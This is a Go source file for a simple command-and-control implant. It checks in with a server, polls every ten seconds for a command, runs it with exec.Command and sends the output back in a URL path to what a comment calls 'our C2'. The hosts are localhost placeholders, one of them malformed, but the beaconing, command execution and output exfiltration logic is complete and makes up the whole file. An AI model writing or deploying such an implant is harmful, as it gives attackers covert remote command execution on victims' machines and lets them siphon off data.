package main

import(
    "net/http"
    //"log"
    "net/url"
    "io/ioutil"
    "regexp"
    "os/exec"
	"time"
	//"fmt"
	
	// 3rd Party
	"github.com/mattn/go-shellwords"
)

func main(){
 const cmd_delay time.Duration = 10
 	init := 0
    for {
     init = GetCmd(init)
	 time.Sleep(cmd_delay * time.Second)
    }
}


func GetCmd(init int) (int){

	var url string

	if (init == 0){
		url = "https://127.0.0.1/agent-check-in"
	}else{
		url = "https://b127.0.0.1/"
	}
    resp, err := http.Get(url)
    if err != nil {
		//log.Fatalln(err)
		return 0
    }

    body, err := ioutil.ReadAll(resp.Body)

    if err != nil {
		//log.Fatalln(err)
		return 0
    }

	var out []byte

	re := regexp.MustCompile(`^([^\s]+)`)
    cmdParsed := re.FindStringSubmatch(string(body))
    cmd := cmdParsed[0]
 
	re = regexp.MustCompile(`\s(.*)`)
	argParsed := re.FindStringSubmatch(string(body))
	var arg string

	if len(argParsed) > 0{
		arg = argParsed[0]
	}

    // Debugging commmand input
    //fmt.Println("Command is: " + cmd + " " + arg)

	argS, err := shellwords.Parse(arg)
			
	if err != nil {
		//log.Fatalln(err)
		return 0
	}


    if cmd != "" && len(argS) > 0 {
        out, err = exec.Command(cmd, argS...).Output()
	} else if cmd != "" {
        out, err = exec.Command(cmd).Output()
	} 
	
    if err != nil {
		//log.Fatalln(err)
		return 0
	}
	
	SendResponse(string(out))
	return 1
}

// Send Response to our C2

func SendResponse(output string){

    url := "https://127.0.0.1/" + url.PathEscape(output)
    _, err := http.Get(url)
    if err != nil {
		//log.Fatalln(err)
		return
    }

}
